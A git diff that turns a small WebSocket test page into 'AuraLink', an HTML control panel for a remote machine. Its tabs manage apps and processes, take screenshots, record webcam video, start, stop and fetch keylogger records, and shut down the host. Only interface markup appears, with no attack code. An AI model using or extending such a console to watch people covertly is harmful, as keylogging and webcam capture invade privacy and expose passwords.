@@ -1,13 +1,220 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <link rel="stylesheet" href="styles.css" />
-    <script src="client.js" defer></script>
-  </head>
-  <body>
-    <h2>WebSocket Test</h2>
-    <textarea cols="60" rows="6"></textarea>
-    <button>send</button>
-    <div id="output"></div>
-  </body>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AuraLink</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <div class="logo-box">
+                <i data-lucide="link" class="logo-icon"></i>
+            </div>
+        </div>
+
+        <nav class="nav-menu">
+            <button class="nav-item active" onclick="switchTab('home', this)">
+                <i data-lucide="home"></i>
+            </button>
+            <button class="nav-item" onclick="switchTab('apps', this)">
+                <i data-lucide="app-window"></i>
+            </button>
+            <button class="nav-item" onclick="switchTab('processes', this)">
+                <i data-lucide="activity"></i>
+            </button>
+            <button class="nav-item" onclick="switchTab('media', this)">
+                <i data-lucide="camera"></i>
+            </button>
+            <button class="nav-item" onclick="switchTab('webcam', this)">
+                <i data-lucide="video"></i>
+            </button>
+            <button class="nav-item" onclick="switchTab('keylogger', this)">
+                <i data-lucide="keyboard"></i>
+            </button>
+
+            <div class="spacer"></div>
+            <button class="nav-item power-nav" onclick="switchTab('power', this)">
+                <i data-lucide="power"></i>
+            </button>
+        </nav>
+    </aside>
+
+    <main class="main-content">
+
+        <header class="top-bar">
+            <h2 id="page-title">Home</h2>
+            <div class="connection-area">
+                <div class="input-pill">
+                    <i data-lucide="network"></i>
+                    <input type="text" id="ipInput" placeholder="192.168.1.X" value="127.0.0.1">
+                </div>
+                <button class="btn-gradient-blue" id="btnConnect">
+                    <span id="btn-text">Connect</span>
+                </button>
+                <div class="status-dot disconnected" id="connection-dot"></div>
+            </div>
+        </header>
+
+        <div class="content-wrapper">
+
+            <section id="tab-home" class="tab-content active">
+                <div class="dashboard-grid">
+                    <div class="card sys-info-card">
+                        <div class="card-header-home">
+                            <i data-lucide="monitor" class="icon-header"></i>
+                            <h3>System Info</h3>
+                        </div>
+                        <div class="info-content">
+                            <div class="info-row"><span>Hostname</span> <strong id="sys-hostname">---</strong></div>
+                            <div class="info-row"><span>OS</span> <strong id="sys-os">---</strong></div>
+                            <div class="info-row"><span>Uptime</span> <strong id="sys-uptime">--:--:--</strong></div>
+                            <div class="info-row"><span>Network</span> <strong id="sys-network" class="text-red">Disconnected</strong></div>
+                        </div>
+                    </div>
+
+                    <div class="card resources-card">
+                        <div class="card-header-home">
+                            <i data-lucide="cpu" class="icon-header"></i>
+                            <h3>Resources</h3>
+                        </div>
+                        <div class="charts-container">
+                            <div class="chart-box">
+                                <div class="circular-chart" id="chart-cpu" style="--p:0; --c:#60a5fa;"><span>0%</span></div>
+                                <p>CPU Usage</p>
+                            </div>
+                            <div class="chart-box">
+                                <div class="circular-chart" id="chart-ram" style="--p:0; --c:#f472b6;"><span>0%</span></div>
+                                <p>RAM Usage</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card sensors-card">
+                        <div class="card-header-home">
+                            <i data-lucide="thermometer" class="icon-header"></i>
+                            <h3>Status</h3>
+                        </div>
+                        <div class="sensor-grid">
+                            <div class="sensor-item"><span>CPU Temp</span> <strong id="sensor-temp">--°C</strong></div>
+                            <div class="sensor-item"><span>Keylogger</span> <strong id="status-keylog" class="text-muted">Idle</strong></div>
+                            <div class="sensor-item"><span>Webcam</span> <strong id="status-webcam" class="text-muted">Idle</strong></div>
+                            <div class="sensor-item"><span>Ping</span> <strong id="sensor-ping">-- ms</strong></div>
+                        </div>
+                    </div>
+
+                    <div class="card logs-card">
+                        <div class="card-header-home">
+                            <i data-lucide="history" class="icon-header"></i>
+                            <h3>Recent Activity</h3>
+                        </div>
+                        <div class="activity-scroll">
+                            <ul class="activity-list" id="activity-list">
+                                <li><span class="dot-log blue"></span> Waiting for connection...</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-apps" class="tab-content">
+                <div class="card full-height">
+                    <div class="card-header"><h3>Application Manager</h3></div>
+                    <div class="control-bar">
+                        <input type="text" id="appInput" placeholder="App Name (e.g. notepad)..." class="glass-input grow">
+                        <button class="btn-gradient-blue" onclick="handleAppAction('start')"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
+                        <button class="btn-danger-red" onclick="handleAppAction('kill')"><i data-lucide="square" class="btn-icon-inside"></i> Stop</button>
+                        <div class="divider"></div>
+                        <button class="btn-secondary" onclick="sendCmd('list-apps')">List</button>
+                        <button class="btn-icon-only" onclick="sendCmd('list-apps')"><i data-lucide="refresh-cw"></i></button>
+                    </div>
+                    <div class="table-wrapper">
+                        <table class="glass-table">
+                            <thead><tr><th>PID</th><th>Name</th><th>Threads</th><th>RAM (MB)</th></tr></thead>
+                            <tbody id="app-list-body"><tr><td colspan="4" class="text-center">Press List to view running apps</td></tr></tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-processes" class="tab-content">
+                <div class="card full-height">
+                    <div class="card-header"><h3>System Processes</h3></div>
+                    <div class="control-bar">
+                        <input type="text" id="procInput" placeholder="PID or Name..." class="glass-input grow">
+                        <button class="btn-gradient-blue" onclick="handleProcessAction('start')"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
+                        <button class="btn-danger-red" onclick="handleProcessAction('kill')"><i data-lucide="x-circle" class="btn-icon-inside"></i> Kill</button>
+                        <div class="divider"></div>
+                        <button class="btn-secondary" onclick="sendCmd('ps')">List</button>
+                        <button class="btn-icon-only" onclick="sendCmd('ps')"><i data-lucide="refresh-cw"></i></button>
+                    </div>
+                    <div class="table-wrapper">
+                        <table class="glass-table">
+                            <thead><tr><th>PID</th><th>Name</th><th>Threads</th><th>RAM (MB)</th></tr></thead>
+                            <tbody id="process-list-body"><tr><td colspan="4" class="text-center">Click List or Refresh to load data</td></tr></tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-media" class="tab-content">
+                <div class="card center-content">
+                    <div class="preview-box" id="screenshot-preview">
+                        <div class="placeholder-content"><i data-lucide="image"></i><p>No screenshot</p></div>
+                    </div>
+                    <div class="controls-row">
+                        <button class="btn-gradient-hybrid large" onclick="alert('Tính năng đang cập nhật')"><i data-lucide="aperture" class="btn-icon-inside"></i> Take Screenshot</button>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-webcam" class="tab-content">
+                <div class="card center-content">
+                    <div class="preview-box video-mode" id="webcam-preview">
+                        <div class="placeholder-content"><i data-lucide="video-off"></i><p>Webcam Idle</p></div>
+                    </div>
+                    <div class="controls-row">
+                        <button class="btn-gradient-hybrid large" id="btn-record" onclick="requestWebcam()"><i data-lucide="radio" class="btn-icon-inside"></i> Record 10s</button>
+                    </div>
+                    <div id="webcam-download-area" class="mt-20"></div>
+                </div>
+            </section>
+
+            <section id="tab-keylogger" class="tab-content">
+                <div class="card full-height">
+                    <div class="card-header">
+                        <h3>Keylogger Records</h3>
+                        <div class="actions">
+                            <button class="btn-gradient-blue" onclick="sendCmd('start-keylog')"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
+                            <button class="btn-danger-red" onclick="sendCmd('stop-keylog')"><i data-lucide="square" class="btn-icon-inside"></i> Stop</button>
+                            <button class="btn-secondary" onclick="sendCmd('get-keylog')"><i data-lucide="download-cloud" class="btn-icon-inside"></i> Fetch</button>
+                        </div>
+                    </div>
+                    <div class="log-container" id="keylog-output"><span class="text-muted">Waiting for data...</span></div>
+                </div>
+            </section>
+
+            <section id="tab-power" class="tab-content">
+                <div class="power-wrapper">
+                    <div class="power-card">
+                        <div class="power-icon-bg shutdown-bg"><i data-lucide="power"></i></div>
+                        <button class="btn-power-pill gradient-red" onclick="confirmPower('shutdown')">Shutdown</button>
+                    </div>
+                    <div class="power-card">
+                        <div class="power-icon-bg restart-bg"><i data-lucide="rotate-cw"></i></div>
+                        <button class="btn-power-pill gradient-blue" onclick="confirmPower('restart')">Restart</button>
+                    </div>
+                </div>
+            </section>
+
+        </div>
+    </main>
+
+    <script src="client.js"></script>
+    <script>if(typeof lucide !== 'undefined') lucide.createIcons();</script>
+</body>
 </html>
